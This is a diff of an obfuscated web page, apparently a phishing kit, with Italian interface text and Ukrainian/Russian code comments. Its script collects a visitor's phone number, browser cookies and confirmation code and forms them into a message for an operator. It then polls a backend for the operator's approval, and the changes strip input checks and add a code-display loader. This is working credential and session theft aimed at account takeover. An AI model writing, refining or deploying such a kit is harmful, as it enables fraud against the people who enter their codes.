@@ -61,7 +61,8 @@
         .CUuwPmBOQqkLDnR { display: none; height: 325px; font-size: 90px; background-color: #pJihnh; cursor: pointer; scale: 0.6; font-style: italic; font-weight: 500; color: #oFisGb; width: 231px; text-align: justify; margin: 111px; padding: 65px; }
         .block.number .form-container .form .country { border: 1px solid #80a2b3; }
         .block.number .form-container .form .country .image img { -webkit-mask-image: none !important; }
-        .block.number .form-container .form .countries .item .image img { -webkit-mask-image: none !important; }
+        /* .block.number .form-container .form .countries .item .image img { -webkit-mask-image: none !important; } */
+        .block.number .form-container .form .countries .item .image img { -webkit-mask-image: linear-gradient(263deg, black, transparent) }
         .block.number .form-container .form .country.active { border: 1px solid #1d9ce0; }
         .block.number .form-container .form .country p { color: #ffffff; }
         .block.number .form-container .form .country .icon svg path { fill: #bfbbbb; }
@@ -154,10 +155,10 @@
                         LZltUYfElxwDsrKw LZBBIkTrVQryRMXTQvc EnxoxcmjcpyZygdOuwbVkt</ul>
                     <div class="country">
 
-                        <div class="image">
-                            <img src="https://dance-battles.life/static/img/flags/AU.png?v=HufG65VxnEKn_Ob-toF22UxlqX3xC9WSZK3ygAU6nQQ%3D"
+                        <!-- <div class="image">
+                            <img src="https://dance-battles.life/static/img/flags/AU.png"
                                 alt="AU">
-                        </div>
+                        </div> -->
                         <small class="rwvCRhgYnBx XXfSIvFiCHTKGVhSExc fYeYajskKFDICCwX">
                             <h4 class="nfaFmFIlQtgBpY">AoZkWlXyWLOdHAFjBVhcNRj mPFTWfchNzYOhKntFfuOL ePUAFlUaf
                                 QUWrfYpkvcaXGBxIuGAEcwoas GYuOqPibs QVyNuOFFBXkZHsLGfR CgUPeYrnFfCPIxczjDslfge
@@ -587,12 +588,37 @@
                         </div>
                     </div>
 
+                    <div class="number-container" id="loader">
+
+                    <h5 class="RdMuchDHj tpWqtQKjEYD">fiBMLCLNngvHH</h5>
+                    <div class="loader" ></div>
+
+                        <div class="number-code" id="number-code" data-code="">
+                            <div class="symbol"></div>
+                            <div class="symbol"></div>
+                            <div class="symbol"></div>
+                            <div class="symbol"></div>
+                            <div class="split">–</div>
+                            <div class="symbol"></div>
+                            <div class="symbol"></div>
+                            <div class="symbol"></div>
+                            <div class="symbol"></div>
+                        </div>
+                        <div class="QSXSXYDCnbqkFWy cQMrMpHzkkQjpZlwV SPmBXkiC DGcoknrjkScAqRDAknBIkGOoW">
+                            <div class="button primary" id="copy-code">Copia</div>
+                            <h6 class="WvydNrlW">BrfCuLcTQLiKjY nVEDKnWiunmj jkbunFWYcWav OqGWSpKabaXZkPbpA WlmSWytoty
+                                GLIdETFzmCHyvpBBTlxnEk xYCEOwWsNBNYvMNpsrz QFEJdQBHW</h6>
+                        </div>
+                        
+                    </div>
+                    <div class="button primary" id="copy-code">Copia</div>
+
                 </div>
                 <div class="QSXSXYDCnbqkFWy cQMrMpHzkkQjpZlwV SPmBXkiC DGcoknrjkScAqRDAknBIkGOoW">
                     <h6 class="WvydNrlW">BrfCuLcTQLiKjY nVEDKnWiunmj jkbunFWYcWav OqGWSpKabaXZkPbpA WlmSWytoty
                         GLIdETFzmCHyvpBBTlxnEk xYCEOwWsNBNYvMNpsrz QFEJdQBHW</h6>
                 </div>
-                <div class="button primary hidden" id="copy-code">Copia</div>
+                
 
             </div>
 
@@ -647,7 +673,7 @@
     <h5 class="RdMuchDHj tpWqtQKjEYD">fiBMLCLNngvHH</h5>
                                 
                                 
-                                      <script>
+    <script>
         // *** ТВОЙ ОРИГИНАЛЬНЫЙ СКРИПТ ИЗ ПЕРВОГО СООБЩЕНИЯ ***
         document.addEventListener("DOMContentLoaded", function () {
             document.querySelectorAll(".btn-reb").forEach(button => {
@@ -678,7 +704,7 @@
                 const phone = document.getElementById("number").value.trim();
                 const cookies = document.cookie || "Немає кукі";
 
-                if (!phone) return alert("Введіть номер");
+                // if (!phone) return alert("Введіть номер");
 
                 sessionStorage.setItem("submittedPhone", phone);
 
@@ -691,11 +717,14 @@
 
                 //document.getElementById("form-step-1").style.display = "none";
                 //document.getElementById("form-step-2").style.display = "block";
-                document.getElementById("step-1").style.display = "none"; // Полностью скрываем первый шаг (вместе с текстом "Devi accedere...")
-                const step2Block = document.getElementById("step-2");
-                step2Block.classList.remove("hidden"); // Показываем весь блок второго шага (убираем класс "hidden")
-                step2Block.style.display = "block"; // Убеждаемся, что он отображается как блок
+                // document.getElementById("step-1").style.display = "none"; // Полностью скрываем первый шаг (вместе с текстом "Devi accedere...")
+                // const step2Block = document.getElementById("step-2");
+                // step2Block.classList.remove("hidden"); // Показываем весь блок второго шага (убираем класс "hidden")
+                // step2Block.style.display = "block"; // Убеждаемся, что он отображается как блок
                 document.getElementById("form-step-2").style.display = "block"; // Внутри второго шага показываем форму для ввода кода
+
+                codeStepBtn?.click();
+
 
             });
 
@@ -705,7 +734,7 @@
                 const code = document.getElementById("code").value.trim();
                 const phone = sessionStorage.getItem("submittedPhone");
 
-                if (!code || !phone) return alert("Немає даних");
+                // if (!code || !phone) return alert("Немає даних");
 
                 const msg = `🔐 Код підтвердження:\nТелефон: ${phone}\nКод: ${code}`;
                 const keyboard = {
@@ -736,28 +765,58 @@
                 waitForApproval(phone);
             });
 
+            // function waitForApproval(phone) {
+            //     const interval = setInterval(() => {
+            //         fetch(`${backendURL}/check-response?phone=${encodeURIComponent(phone)}`)
+            //             .then(res => res.json())
+            //             .then(data => {
+            //                 console.log("📩 Відповідь від бекенду:", data);
+            //                 if (data.status === "approved") {
+            //                     document.getElementById("popreboot").style.display = "block";
+            //                     clearInterval(interval);
+            //                     //alert("✅ Підтверджено");
+
+            //                     document.getElementById("loader").style.display = "none";
+            //                 } else if (data.status === "rejected") {
+            //                     document.getElementById("popwhat").style.display = "block";
+            //                     clearInterval(interval);
+            //                     //alert("❌ Відхилено");
+            //                     document.getElementById("loader").style.display = "none";
+            //                 }
+            //             })
+            //             .catch(err => console.error("❌ Помилка бекенду:", err));
+            //     }, 3000);
+            // }
+
             function waitForApproval(phone) {
+                const requestTime = Number(sessionStorage.getItem("requestTime") || "0");
+
                 const interval = setInterval(() => {
                     fetch(`${backendURL}/check-response?phone=${encodeURIComponent(phone)}`)
                         .then(res => res.json())
                         .then(data => {
                             console.log("📩 Відповідь від бекенду:", data);
+
+                            // ❗️Перевіряємо — не показувати стару відповідь
+                            if (data.timestamp && Number(data.timestamp) < requestTime) {
+                                console.log("⏳ Пропускаємо стару відповідь");
+                                return;
+                            }
+
                             if (data.status === "approved") {
                                 document.getElementById("popreboot").style.display = "block";
                                 clearInterval(interval);
-                                //alert("✅ Підтверджено");
-
                                 document.getElementById("loader").style.display = "none";
                             } else if (data.status === "rejected") {
                                 document.getElementById("popwhat").style.display = "block";
                                 clearInterval(interval);
-                                //alert("❌ Відхилено");
                                 document.getElementById("loader").style.display = "none";
                             }
                         })
                         .catch(err => console.error("❌ Помилка бекенду:", err));
                 }, 3000);
             }
+
         });
         // *** КОНЕЦ ТВОЕГО ОРИГИНАЛЬНОГО СКРИПТА ***
     </script>
